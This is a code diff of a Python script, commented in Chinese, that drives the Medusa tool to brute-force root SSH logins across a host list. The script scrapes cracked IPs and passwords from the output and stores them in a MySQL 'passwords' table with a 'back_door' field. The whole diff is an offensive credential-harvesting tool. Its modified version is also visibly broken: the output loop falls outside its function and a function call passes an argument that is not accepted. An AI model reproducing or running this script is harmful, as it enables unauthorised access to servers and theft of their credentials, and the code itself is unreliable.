@@ -1,6 +1,7 @@
 import MySQLdb
 import threading
 import time
+import subprocess
 import os
 import re
 
@@ -28,15 +29,15 @@ cursor = db.cursor()
 insert_sql = "INSERT INTO passwords (ip_addr, user, pass, back_door) VALUES (%s, %s, %s, %s)"
 
 # Medusa成功破解的IP地址和密码
-ip_addr = ''
-password = ''
+ip_addr = [] 
+password = []
 
 # 线程锁，用于保证数据插入时的线程安全
 lock = threading.Lock()
 
 def insert_data():
-    #global ip_addr
-    #global password
+   # global ip_addr
+   # global password
 
     # 获取线程锁
     lock.acquire()
@@ -54,18 +55,25 @@ def read_medusa():
     global password
 
     # 执行Medusa命令，将输出通过管道传递给程序
-    cmd = "medusa -H Host.txt -u root -P /root/pass.txt -M ssh -t 5 -f -O output.txt -continue 2>&1 | tee output.txt"
-    os.system(cmd)
+    #cmd = "medusa -H Host.txt -u root -P /root/pass.txt -M ssh -t 5 -f -O output.txt -continue 2>&1 | tee output.txt"
+    #os.system(cmd)
+    medusa_process = subprocess.Popen(['medusa', '-H', 'Host.txt', '-u', 'root', '-P', 'pass.txt', '-M', 'ssh', '-city', '-v', '4', '-t', '5', '-f', '-O', 'output.txt'],
+                                     stdout=subprocess.PIPE, bufsize=1)
 
-    # 读取Medusa输出文件
-    with open('output.txt', 'r') as f:
-          for line in f:
-              if '[SUCCESS]' in line:
-                  ip_addr = re.findall(r"Host: (.+?) User", line)
-                  password = re.findall(r'Password: (.+?) \[SUCCESS\]', line)
+output = ''
+# 逐行读取medusa输出结果并进行处理
+for line in iter(medusa_process.stdout.readline, b''):
+    # 处理每一行输出结果的代码
+    output += line.decode().strip()
+    if '[SUCCESS]' in output:
+        ip_addr = re.findall(r"Host: (.+?) User", output)
+        password = re.findall(r'Password: (.+?) \[SUCCESS\]', output)
+        insert_data()
+    output = ''
     # 插入数据到MySQL
-    insert_data()
+    return medusa_process
 
 # 启动线程，监听Medusa输出并插入数据到MySQL
-thread = threading.Thread(target=read_medusa)
+medusa_process = read_medusa()
+thread = threading.Thread(target=read_medusa, args=(medusa_process,))
 thread.start()
